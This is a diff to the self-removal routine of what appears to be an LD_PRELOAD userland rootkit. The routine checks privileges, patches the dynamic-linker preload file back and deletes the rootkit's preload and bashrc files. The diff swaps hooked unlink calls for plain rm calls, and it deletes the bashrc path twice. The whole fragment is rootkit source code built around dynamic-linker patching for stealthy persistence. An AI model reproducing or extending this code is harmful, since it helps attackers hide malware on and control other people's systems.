@@ -3,16 +3,15 @@ int remove_self(void){
     if(notuser(0))
         return VINVALID_PERM;
 
-    hook(CUNLINK);
 #ifdef PATCH_DYNAMIC_LINKER
     ldpatch(PRELOAD_FILE, OLD_PRELOAD);
-    call(CUNLINK, PRELOAD_FILE);
+    rm(PRELOAD_FILE);
 #else
-    call(CUNLINK, OLD_PRELOAD);
+    rm(OLD_PRELOAD);
 #endif
 #ifdef ROOTKIT_BASHRC
-    call(CUNLINK, BASHRC_PATH);
-    call(CUNLINK, BASHRC_PATH);
+    rm(BASHRC_PATH);
+    rm(BASHRC_PATH);
 #endif
 
     pid_t pid = fork();
